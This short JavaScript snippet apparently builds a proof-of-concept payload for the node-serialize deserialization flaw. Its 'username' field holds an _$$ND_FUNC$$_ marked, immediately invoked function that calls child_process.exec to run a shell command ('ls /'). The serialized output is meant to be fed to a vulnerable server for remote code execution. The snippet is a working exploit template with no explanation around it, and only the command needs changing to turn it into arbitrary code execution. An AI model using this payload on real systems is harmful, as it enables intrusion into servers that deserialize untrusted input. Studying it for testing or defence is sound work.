var y =
{
	"username":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()",
	"country":"Idk Probably Somewhere Dumb",
	"city":"Lametown",
	"num":"2"
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
